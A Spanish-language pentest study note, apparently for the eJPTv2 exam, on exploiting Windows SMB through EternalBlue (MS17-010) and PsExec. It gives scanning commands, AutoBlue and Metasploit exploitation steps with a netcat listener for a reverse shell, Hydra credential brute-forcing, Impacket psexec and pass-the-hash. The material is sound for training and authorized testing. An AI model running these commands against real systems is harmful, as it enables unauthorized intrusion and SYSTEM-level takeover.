**SMB (Server Message Block)** es un protocolo de red cliente-servidor diseñado para compartir recursos (archivos, impresoras) y permitir la comunicación entre procesos (IPC) en una red local.
- **Puerto:** 445 (TCP)
## 📁 SMB: Exploit EternalBlue (MS17-010)
El exploit **EternalBlue** aprovecha una vulnerabilidad crítica en la implementación del protocolo **SMBv1** de Microsoft. Permite a un atacante enviar paquetes especialmente diseñados para ejecutar código arbitrario en la máquina objetivo.

- **CVE:** [CVE-2017-0144](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144)
- **Impacto:** Proporciona una shell con los máximos privilegios posibles: `NT AUTHORITY\SYSTEM`.
### Sistemas Operativos Vulnerables
Esta vulnerabilidad afecta principalmente a sistemas que no han sido parcheados desde 2017:
- **Workstations:** Windows Vista, 7, 8.1, 10.
- **Servers:** Windows Server 2008, 2012, 2016.

> [!caution ] Notas de Seguridad y Estabilidad: **Riesgo de BSOD (Blue Screen of Death):** EternalBlue es un exploit de corrupción de memoria. Existe una posibilidad real de provocar un pantallazo azul en el objetivo si el exploit falla o se lanza varias veces.

### 🛠️ Metodología de Ataque

#### 1. Enumeración y Verificación
Antes de lanzar el exploit, debemos confirmar que el objetivo utiliza **SMBv1** y es vulnerable al **MS17-010**.

|**Herramienta**|**Método / Comando**|
|---|---|
|**Nmap**|`nmap -p445 --script=smb-vuln-ms17-010 <IP>`|
|**Metasploit**|`use auxiliary/scanner/smb/smb_ms17_010`|
#### 2. Explotación
Existen dos vías principales para comprometer el sistema:
##### A. Explotación Manual (AutoBlue)
Ideal cuando no se permite el uso de Metasploit o para entender el funcionamiento interno.
Herramienta: AutoBlue-MS17-010 [AutoBlue-GitHub](https://github.com/3ndG4me/AutoBlue-MS17-010)
**Flujo de trabajo:**
1. Clonamos el repositorio: `git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git`
2. Ejecutar `shell_prep.sh` para generar los payloads (LHOST/LPORT).
3. Lanzar el listener (usualmente un `nc -lvnp <Puerto_de_escucha>`).
4. Ejecutar el script de explotación (ej. `eternalblue_exploit7.py`) especificando la IP objetivo y el payload generado.

> [!note] En el README del repositorio, estás las instrucciones detalladas del uso de la herramienta

##### B. Explotación con [[Metasploit]] (Recomendado para eJPTv2)
Es la forma más rápida y estable de obtener una sesión de [[Meterpreter]].

1. **Cargar módulo:** `use exploit/windows/smb/ms17_010_eternalblue`
2. **Configurar opciones:**
    - `set RHOSTS <IP_Objetivo>`
    - `set LHOST <Tu_IP>`
3. **Ejecutar:** `exploit` o `run`
## 🚀 PsExec: Ejecución Remota de Comandos

- **Requisito:** Credenciales válidas (usuario y contraseña o Hash NTLM).
- **Privilegios:** Si el usuario tiene permisos administrativos, PsExec elevará la sesión automáticamente a `NT AUTHORITY\SYSTEM`.
### 🛠️ Metodología de Ataque

#### 1. Descubrir credenciales
Antes de usar PsExec, debemos conocer un par de credenciales válidas. Si no las tenemos mediante post-explotación previa, recurrimos a la fuerza bruta:

| **Herramienta** | **Comando / Módulo**                          |
| --------------- | --------------------------------------------- |
| **Hydra**       | `hydra -L <users.txt> -P <pass.txt> <IP> smb` |
| **Metasploit**  | `use auxiliary/scanner/smb/smb_login`         |
#### 2. Ejecución del Exploit
##### A. Método Manual (Impacket)
En Kali Linux, la implementación más estable de PsExec pertenece a la suite **Impacket**. Es ideal para evitar el uso ruidoso de Metasploit.
- **Ruta del binario:** `/usr/share/doc/python3-impacket/examples/psexec.py`
- **Comandos de uso**: 
	- Ejecución directa (si esta en el PATH)
		- `psexec.py <user>@<IP> cmd.exe
	- Si no reconoce el comando, puedes usar la ruta absoluta del binario (ruta de arriba)
		- `python3 /usr/share/doc/python3-impacket/examples/psexec.py <usuario>@<IP>`

##### B. Método con [[Metasploit]]
Es la forma más rápida de obtener una sesión de [[Meterpreter]] con privilegios máximos.

- **Cargar módulo:** `use exploit/windows/smb/psexec`
- **Configurar opciones:**
    - `set RHOSTS <IP_TARGET>`
    - `set SMBUser <usuario>`
    - `set SMBPass <password>` (También acepta un Hash NTLM para ataques [[Pass the Hash Attacks]])
- **Ejecutar:** `run` o `exploit`

### ⚠️ Notas Técnicas y Troubleshooting

- **Recurso `ADMIN$`:** PsExec requiere que el recurso compartido `ADMIN$\` esté habilitado y sea accesible. Si está deshabilitado, el exploit fallará.
- **UAC (User Account Control):** En versiones modernas de Windows, si el usuario es administrador local pero no es el usuario "Administrator" integrado, el UAC puede bloquear la ejecución remota a menos que se haya modificado el registro (`LocalAccountTokenFilterPolicy`).
- **Detección:** PsExec es altamente ruidoso. Crea un servicio temporal y deja rastros claros en los logs de eventos de Windows.
##
---
**Navegación:**
- Volver a: [[2.2 Servicios de Windows Frecuentemente Explotados]]
- Volver a: [[3.1 Explotación Vulnerabilidades de Windows]]